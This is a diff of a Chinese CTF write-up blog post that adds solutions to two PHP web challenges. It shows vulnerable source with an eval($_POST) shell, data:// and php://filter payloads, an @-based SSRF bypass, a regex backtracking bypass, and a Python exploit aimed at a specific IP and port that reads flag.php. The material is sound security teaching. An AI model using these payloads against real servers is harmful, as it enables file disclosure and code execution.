@@ -27,7 +27,7 @@
 <meta property="og:description" content="滤个不停123456789101112131415161718192021222324252627282930313233343536373839&lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent &#x3D; $_POST[&#x27;incompetent&#x27;]; $Datch &#x3D; $_POST[&#x27;Da">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-11-30T06:16:42.000Z">
-<meta property="article:modified_time" content="2025-12-10T09:00:34.781Z">
+<meta property="article:modified_time" content="2025-12-13T05:50:18.457Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          756 字
+          1.8k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          7 分钟
+          16 分钟
         
       </span>
     
@@ -303,7 +303,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年12月10日 下午
+                    本文最后更新于 2025年12月13日 下午
                   
                 
               </p>
@@ -333,6 +333,56 @@
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">GET:</span><br>?K=GlobIterator<span class="hljs-variable">&amp;</span>W=glob:<span class="hljs-comment">///secret/*</span><br><span class="hljs-symbol">POST:</span><br>J=SplFileObject<span class="hljs-variable">&amp;</span>H=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=/secret/f11444g.php</span><br></code></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://www.qwesec.com/2023/10/phpBuilt-inClasses.html">CTF中PHP原生类的妙用</a></p>
+<h1 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura 酱，欢迎回家~</span><br><span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不是 Aura 的博客！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;请去博客里面写下感想哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>); <br></code></pre></td></tr></table></figure>
+
+<p>首先对于第一个判断, 他需要读取一个文件后内容是 <code>Aura</code>,我们可以尝试通过 <code>data://</code> 伪协议来进行读取</p>
+<p>在文件读取的情况下, 利用 <code>data://</code> 伪协议:</p>
+<ul>
+<li><code>data://text/plain,一串内容</code> 可以读取出 <code>一串内容</code></li>
+<li><code>data://text/plain;base64,xxxxxxxx</code> 其中 <code>xxxxxxx</code> 会被 Base64 解码后再读取出内容</li>
+</ul>
+<p>所以我们此处可以使用:</p>
+<ul>
+<li><code>data://text/plain,Aura</code></li>
+<li><code>data://text/plain;base64,QXVyYQ==</code></li>
+</ul>
+<p>第二个判断的话, 我们要求页面的开头为 <code>http://jasmineaura.github.io</code></p>
+<p>我们可以利用 <code>@</code> 来进行隔断, 将 <code>@</code> 前面的内容当做用户名 (参考 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2288231">https://cloud.tencent.com/developer/article/2288231</a>)</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>URL 的格式为 <code>scheme://user:password@address:port/path?query#fragment</code></p>
+</blockquote>
+<p>而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造</p>
+<p><code>http://jasmineaura.github.io@127.0.0.1</code></p>
+<p>第三个的话是一个 include 点, 由于我们的 flag 在注释部分, 我们需要将其伪协议和过滤器来进行 base64 编码后输出</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ya7q/p/19045966">SSRF学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)</a></p>
+<h1 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><span class="hljs-comment"># 我记得她...好像叫flag.php吧？</span><br><span class="hljs-variable">$emp</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e_m.p&#x27;</span>];<br><span class="hljs-variable">$try</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;try&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$emp</span>!=<span class="hljs-string">&quot;114514&quot;</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$emp</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">114514</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$emp</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$emp</span>[<span class="hljs-variable">$i</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你不是hacker？那请去外场等候！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="hljs-variable">$try</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你是hacker还敢自报家门呢？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$try</span>,<span class="hljs-string">&#x27;HACKER&#x27;</span>) === <span class="hljs-literal">TRUE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&#x27;php&#x27;</span>)!==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>))-&gt;<span class="hljs-variable">$c</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;114514到底是啥意思嘞？。？&quot;</span>);<br>&#125;<br><span class="hljs-comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span><br><span class="hljs-variable">$shell</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里e_m.p有特殊字符和.所以要将换成[</p>
+<p>因为.+?是匹配一个或多个任意字符,至少需要一个字符,所以必须让HACKER出现在try的参数中，但不是在开头</p>
+<blockquote>
+<p>[!NOTE]</p>
+<ul>
+<li><code>.+?</code> 是「非贪婪匹配」，本意是匹配「任意最少字符」后接 <code>HACKER</code>；</li>
+<li>但当 <code>HACKER</code> 出现在<strong>极长字符串的末尾</strong>（比如 100 万 + 个 <code>-</code> 之后），正则引擎会陷入「无限回溯」：<ol>
+<li>非贪婪的 <code>.+?</code> 先匹配 1 个 <code>-</code>，检查后面是否是 <code>HACKER</code> → 不是；</li>
+<li>匹配 2 个 <code>-</code>，检查后面 → 不是；</li>
+<li>重复这个过程，直到匹配 1000001 个 <code>-</code> 后，才找到末尾的 <code>HACKER</code>；</li>
+<li>PHP 对正则回溯有<strong>内存 &#x2F; 时间限制</strong>（默认配置下，超过一定回溯次数会直接返回 <code>false</code>），导致 <code>preg_match</code> 执行超时 &#x2F; 内存溢出，最终返回 <code>false</code>，第一段检测被绕过。</li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<p>代码 <code>(new $a($b))-&gt;$c()</code>动态实例化类 <code>$a</code>（参数为 <code>$b</code>），并调用方法 <code>$c()</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>res = requests.post(<span class="hljs-string">&quot;http://101.37.149.223:32943/index.php?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;</span>,data = &#123;<span class="hljs-string">&quot;try&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">1000001</span>+<span class="hljs-string">&quot;HACKER&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!NOTE]</p>
+<p>requests.post语法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">response = requests.post(<br>    url,        <span class="hljs-comment"># 必传：请求的URL地址</span><br>    data=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：表单格式的请求体（dict/字符串/字节）</span><br>    json=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：JSON格式的请求体（dict，自动序列化+设置Content-Type: application/json）</span><br>    headers=<span class="hljs-literal">None</span>, <span class="hljs-comment"># 可选：请求头（dict）</span><br>    params=<span class="hljs-literal">None</span>,  <span class="hljs-comment"># 可选：URL中的GET参数（dict）</span><br>    files=<span class="hljs-literal">None</span>,   <span class="hljs-comment"># 可选：文件上传（dict）</span><br>    timeout=<span class="hljs-literal">None</span>, <span class="hljs-comment"># 可选：超时时间（秒，防止请求挂起）</span><br>    verify=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 可选：是否验证SSL证书（False忽略证书错误）</span><br>    cookies=<span class="hljs-literal">None</span>  <span class="hljs-comment"># 可选：请求携带的Cookie（dict）</span><br>)<br></code></pre></td></tr></table></figure></blockquote>
 
                 
               </div>
@@ -394,6 +444,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2025/12/12/SSRF%E8%AF%A6%E8%A7%A3/" title="SSRF详解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSRF详解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
